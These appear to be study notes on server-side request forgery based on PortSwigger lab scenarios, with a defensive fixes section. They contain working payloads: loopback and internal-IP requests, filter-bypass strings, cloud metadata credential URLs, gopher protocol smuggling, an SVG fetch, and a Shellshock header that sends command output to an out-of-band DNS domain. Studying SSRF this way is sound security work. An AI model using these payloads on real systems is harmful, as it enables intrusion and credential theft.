# Server-Side Request Forgery (SSRF)

**CWE-918** (also touches CWE-441 and CWE-611 when chained with XXE)

## So what actually is SSRF?

Basically, SSRF is when you trick the *server* into making a request on your behalf, to somewhere it shouldn't be going. You don't get the request yourself — the app does it for you, using its own network access, its own trust level.

The dangerous part is the server usually has access to stuff you don't — internal admin panels, other internal services, cloud metadata, whatever. So if you can control the URL the server fetches, you basically get to use the server as a proxy into places you're not supposed to be.

## Why does this matter / what can go wrong

- Server can be pointed at internal-only endpoints → access to admin functionality that's normally locked down
- Can leak sensitive data (auth tokens, credentials, internal responses)
- Can lead to full RCE in some cases if the internal service you reach is itself exploitable
- Cloud metadata endpoints (`169.254.169.254`) are a huge target — get those IAM creds and you basically own the cloud account
- Can be used to scan internal network / port scan stuff that's not exposed publicly
- If it can reach external systems too, it can be abused to launch attacks that look like they're coming from the vulnerable org

## SSRF against the server itself (loopback attacks)

Classic case: app has some feature where it fetches a URL you give it. Like a "check stock" feature that hits an internal API.

Normal request:
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

Now just... change the URL to point at the server's own loopback interface:
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```

And boom — the server fetches `/admin` for itself and hands you the response. Why does this work when you couldn't hit `/admin` directly as a normal user? Because a lot of apps implicitly trust anything coming from `localhost`. Some reasons this happens:

- access control is enforced by something sitting in front of the app (like a reverse proxy) — but when the app talks to itself, that layer gets skipped entirely
- "break glass" recovery access — if you're on the box itself, you're assumed to be trusted (sysadmin recovering from lost creds etc.)
- admin panel runs on a different port that's not meant to be reachable externally, so nobody bothered locking it down properly

This localhost-trust thing is honestly one of the most common reasons SSRF turns into something critical instead of just "meh."

## SSRF against other internal systems (not just the server itself)

Same idea, but instead of hitting `localhost`, you're hitting some other machine on the internal network — like `192.168.0.68`.

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
```

These internal boxes are often way less locked down because the assumption was "nobody outside can reach it anyway" — the network topology *was* the security. Once SSRF breaks that assumption, you're basically walking into unauthenticated internal admin panels.

If you don't know the exact internal IP, you can just fuzz the last octet (1–255) using Burp Intruder and look for a response that stands out (a 200 where everything else 404s/times out, for example) — that's your live internal host.

## Getting past filters people put in place

### Blacklist filters (blocking known bad stuff like "localhost" or "admin")

Devs will often try to block `127.0.0.1`, `localhost`, or the string `admin`. Cute, but blacklists are almost always incomplete. Some ways around them:

- different representations of the same IP: `2130706433` (decimal), `017700000001` (octal), or just the shorthand `127.1`
- register a domain that resolves to `127.0.0.1` — Burp Collaborator gives you `spoofed.burpcollaborator.net` for exactly this
- URL-encode or case-vary the blocked string
- IPv6 loopback tricks: `[::1]` or the IPv4-mapped `[::ffff:127.0.0.1]`
- redirect chains — point at a URL you control that 302s to the real target; sometimes even switching protocol mid-redirect (http → https) slips past filters

Real example of chaining bypasses together:
```
http://127.0.0.1/          → blocked
http://127.1/              → gets past the IP blacklist
http://127.1/admin         → blocked again (string match on "admin")
http://127.1/%2561dmin     → double-encoded "a" — filter checks the encoded string, 
                              server decodes twice and it becomes /admin
```

That double-encoding trick is the kind of thing that works because the filter and the actual HTTP client don't decode things the same number of times. Filter sees garbage, thinks it's fine, back-end decodes it into something dangerous.

### Whitelist filters (only allowing specific hosts)

Harder to beat than a blacklist, but URL parsing is genuinely messy and different components parse URLs differently — that inconsistency is your way in.

- credentials-in-URL trick: `https://expected-host:fakepassword@evil-host` — the whitelist regex might match on `expected-host` appearing early in the string, but the browser/HTTP client actually connects to `evil-host`
- fragment trick: `https://evil-host#expected-host`
- subdomain trick: `https://expected-host.evil-host` — technically contains the whitelisted string, but the actual host is `evil-host`
- encode stuff, maybe even double-encode it, especially if the filter and the request-making code decode differently

Real chain from a whitelist-filter scenario (whitelist only allows `stock.weliketoshop.net`):
```
http://127.0.0.1/                                        → rejected, not on the list
http://username@stock.weliketoshop.net/                   → accepted — parser allows creds before @
http://username@stock.weliketoshop.net/#                  → rejected once # is added
http://username@stock.weliketoshop.net/%2523               → weird 500 error — interesting!
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

What's happening: the filter decodes `%2523` once and sees `%23` → treats it as still-encoded, passes it. The actual HTTP client double-decodes it into a literal `#`, which turns everything after it into a URL fragment — meaning the *real* host being requested is `localhost:80`, not `stock.weliketoshop.net` at all.

### Bypassing filters using an open redirect elsewhere in the app

If the whitelisted domain itself has an open redirect bug, you can smuggle your real target through it — assuming the code fetching the URL actually follows redirects (a lot of them do by default).

Say there's an open redirect at:
```
/product/nextProduct?currentProductId=6&path=http://evil-user.net
```

You feed that whole thing into the vulnerable parameter:
```
stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

The filter checks `stockApi` → sees `weliketoshop.net` → totally allowed. App fetches it, hits the redirect, follows it straight into your internal target. Filter never even sees the real destination.

## Blind SSRF — when you don't get the response back

Sometimes you can *trigger* the request but you never see what came back. Way more annoying to confirm and exploit, but it's not useless — you just need out-of-band detection instead (Burp Collaborator basically).

### Referer header is a sneaky one

Analytics software on the back end sometimes visits whatever's in your `Referer` header — to check who's linking to them, scrape anchor text, whatever. If you control that header and it gets fetched server-side, that's SSRF.

```
GET /product?productId=1 HTTP/1.1
Host: vulnerable-website.com
Referer: http://YOUR-SUBDOMAIN.oastify.com
```

Nothing shows up in the response. You just poll your Collaborator listener afterward and — if it worked — you'll see a DNS/HTTP hit come in from the target's infrastructure. That confirms the blind SSRF even with zero visible feedback.

### Taking it further — blind SSRF into RCE (Shellshock example)

If the internal thing you're hitting blindly is itself vulnerable (old CGI script vulnerable to Shellshock, for instance), you can chain command execution on top of the blind SSRF and exfiltrate data purely through DNS.

```
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN.oastify.com
Referer: http://192.168.0.X:8080
```

The internal service processes that header, executes the shellshock payload, and the resulting DNS lookup literally contains the output of `whoami` as a subdomain. You watch your Collaborator log and read the username straight out of the DNS query. No response body needed at all — that's the beauty (and horror) of blind SSRF chained with OOB exfil.

## Attack surface that's easy to miss

- **partial URLs** — sometimes only a hostname or path fragment goes into the parameter, and it's stitched into a full URL server-side. Attack surface is there but you might not fully control the final URL.
- **XML / XXE** — if the app parses XML and it's vulnerable to XXE, external entities can be used to trigger SSRF too. Worth checking any XML-accepting endpoint.
- **cloud metadata endpoints** — this one's huge in real engagements:
  ```
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  ```
  (AWS — note IMDSv2 requires a PUT to get a token first, which blocks naive SSRF unless the app happens to pass headers through). GCP needs a `Metadata-Flavor: Google` header, Azure needs `Metadata: true`. Get this right and you can walk away with live IAM credentials.
- **protocol smuggling** — if the library making the request supports schemes beyond http/https, you can talk to totally different services:
  - `file:///etc/passwd` — read local files if the library resolves it
  - `gopher://internal-host:6379/_...` — craft raw bytes to speak Redis protocol, potentially get a webshell written to disk
  - `dict://internal-host:11211/stat` — poke at Memcached
- **file upload / rendering pipelines** — image/PDF/SVG processors that fetch remote resources. Classic SVG SSRF:
  ```xml
  <svg xmlns="http://www.w3.org/2000/svg">
    <image xlink:href="http://169.254.169.254/latest/meta-data/" />
  </svg>
  ```
  If the server renders this (thumbnail generation, PDF export, whatever), it'll fetch that URL for you.
- **DNS rebinding** — sneaky TOCTOU bug. Domain resolves to a "safe" IP when the filter checks it, then you rebind the DNS record (short TTL) so by the time the actual request fires, it resolves to `127.0.0.1` or the metadata IP instead. Really hard to defend against with hostname-based filtering alone.

## How you'd actually fix this (defender side)

- whitelist the *exact* host/port/scheme needed — don't try to blacklist your way out of this
- kill off schemes you don't need — only allow http/https, block file/gopher/dict/ftp
- turn off automatic redirect-following on the back-end HTTP client
- don't echo the raw response back to the user — removes a lot of the "easy win" cases
- proper network segmentation — the app server shouldn't even be *able* to reach sensitive internal stuff or metadata endpoints, regardless of what the application layer filters
- AWS specifically — enforce IMDSv2, makes naive metadata SSRF much harder
- don't treat "request came from localhost" as inherently trustworthy — authenticate internal interfaces too

## How this relates to other bug classes (so I stop mixing them up)

| Bug | How it's different from SSRF |
|---|---|
| XXE | Attacks the XML parser directly; can be a *path into* SSRF, not the same thing |
| Open Redirect | Redirects the victim's browser; SSRF can *use* one to dodge filters, but they're separate bugs |
| CSRF | Forges a request from the victim's browser using their session; SSRF forges it from the server itself |
| RFI | Server ends up including/executing remote code; can be where SSRF escalates *to* |

## Quick reference

| What | Payload example |
|---|---|
| Basic loopback | `http://localhost/admin`, `http://127.0.0.1/admin` |
| Internal IP scan | `http://192.168.0.X:PORT/admin` (fuzz the octet) |
| IP obfuscation | `2130706433`, `017700000001`, `127.1` |
| Domain → localhost | `spoofed.burpcollaborator.net` |
| Double-encode bypass | `%2561dmin` |
| Open redirect chain | `/nextProduct?path=http://internal-ip/admin` |
| Creds-in-URL bypass | `http://expected-host:pass@evil-host` |
| Fragment bypass | `http://evil-host#expected-host` |
| Subdomain bypass | `http://expected-host.evil-host` |
| Referer-based blind SSRF | Collaborator payload in `Referer` header |
| Blind SSRF → RCE | `() { :; }; /usr/bin/nslookup $(whoami).collab-domain` |
| Cloud metadata | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| Protocol smuggling | `gopher://127.0.0.1:6379/_...` |

---
**Refs:**
- [PortSwigger: Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
- [PortSwigger: Finding and exploiting blind SSRF vulnerabilities](https://portswigger.net/web-security/ssrf/blind)
- [PortSwigger: A new era of SSRF](https://portswigger.net/blog/top-10-web-hacking-techniques-of-2017#1)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
